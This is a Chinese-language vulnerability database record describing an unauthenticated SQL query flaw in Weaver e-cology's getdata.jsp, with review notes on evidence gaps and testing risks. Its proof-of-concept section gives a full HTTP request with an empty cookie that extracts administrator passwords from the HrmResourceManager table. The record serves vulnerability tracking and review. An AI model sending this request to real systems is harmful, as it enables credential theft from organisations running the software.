---
source: "hatch 补库批 20260928"
title: "泛微e-cology getdata.jsp任意SQL查询"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "声称<=9.0，未给补丁；SQL查询HrmResourceManager"
prerequisites: "空cookie请求"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20%3C%20%3D9.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-63c9481ea36670e1bcbbce9b"
entity_id: "ve-63c9481ea36670e1bcbbce9b"
schema_version: "1"
---

# 泛微e-cology getdata.jsp任意SQL查询

## 条目说明

- 对象与具体问题：泛微e-cology；getdata.jsp任意SQL查询
- 版本、配置及部署条件：声称<=9.0，未给补丁；SQL查询HrmResourceManager
- 认证与权限前提：空cookie请求
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 简介空白，只有敏感表查询请求无响应/根因/修复/原文链接
- 标题需加getdata.jsp，和2025的同接口修复通告必须按补丁历史对比，不能直接等同
- 双斜杠路径意义未解释；影响版本过泛

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

泛微OA \< =9.0

三、复现过程
------------

```http
    GET //js/hrm/getdata.jsp?cmd=getSelectAlld&sql=select%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
    Host: www.0-sec.org
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie:
    Connection: close
```
